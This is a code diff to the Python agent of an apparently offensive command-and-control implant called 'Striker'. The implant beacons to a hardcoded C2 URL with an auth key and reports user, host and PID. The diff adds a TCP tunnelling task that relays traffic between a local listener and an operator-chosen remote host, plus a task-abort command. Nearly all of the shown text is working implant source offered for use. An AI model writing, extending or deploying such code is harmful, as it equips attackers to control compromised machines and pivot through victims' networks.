@@ -6,9 +6,10 @@ import subprocess
 import shlex
 import json
 import time
-sleep = time.sleep
+from time import sleep
 import threading
 import urllib3
+import socket
 
 c2URL = "https://striker-api.debian.local"
 authKey = "345c8856fc611d5e3074385404550268"
@@ -71,15 +72,48 @@ class Striker:
     for chunk in res.stream(4096): wfo.write(chunk)
     res.release_conn()
     wfo.close()
+    return
 
   def info(self):
     return {
+      "type": 1,
       "user": self.user,
       "pid": os.getpid(),
       "cwd": os.getcwd(),
       "os": self.os,
       "host": self.hostname
     }
+
+  def tunnel(self, task, client, rhost, rport):
+    server = socket.socket()
+    try:
+      server.connect((rhost, rport))
+    except:
+      client.close()
+      return
+    client.settimeout(0.005)
+    server.settimeout(0.005)
+    blockSize = 999999
+    while not self.abort and not task["abort"]:
+      try:
+        data = client.recv(blockSize)
+        if (len(data) == 0):
+          break
+        server.send(data)
+      except socket.error as e:
+        if not str(e).startswith("timed out"):
+          break
+      try:
+        data = server.recv(blockSize)
+        if (len(data) == 0):
+          break
+        client.send(data)
+      except socket.error as e:
+        if not str(e).startswith("timed out"):
+          break
+    client.close()
+    server.close()
+    return
 
   def execTask(self, task):
     taskID = task['uid']
@@ -131,8 +165,41 @@ class Striker:
         successful = 1
       except Exception as e:
         result = "Error uploading file: " + str(e)
+    elif (task["taskType"] == "tunnel"):
+      sock = socket.socket()
+      sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+      try:
+        sock.bind((data["lhost"], int(data["lport"])))
+        sock.listen(10)
+        sock.settimeout(1)
+        while not self.abort and not task["abort"]:
+          try:
+            client, addr = sock.accept()
+            t = threading.Thread(target=self.tunnel, args=(task, client, data["rhost"], int(data["rport"])))
+            t.start()
+          except socket.error as e:
+            if not str(e).startswith("timed out"):
+              break
+        sock.close()
+        result = "Tunnel closed!"
+        successful = 1
+      except Exception as e:
+        result = "Error starting TCP tunnel: " + str(e)
+    elif (task["taskType"] == "kill"):
+      targetID = data["uid"]
+      for tID in self.tasks:
+        target = self.tasks[tID]
+        if target["uid"] == targetID:
+          target["abort"] = True
+          successful = 1;
+          break
+      if successful:
+        result = "Abort signal set for task: " + targetID
+      else:
+        result = "Invalid task: " + targetID
     task["result"] = {"uid":taskID, "result":result, "successful": successful}
     task["finished"] = True
+    return
 
   def connectToBase(self):
     connected = False
@@ -197,6 +264,7 @@ class Striker:
         continue
       for task in newTasks:
         task["finished"] = False
+        task["abort"] = False
         self.tasks[task["uid"]] = task
         t = threading.Thread(target=self.execTask, args=(task,))
         t.start()
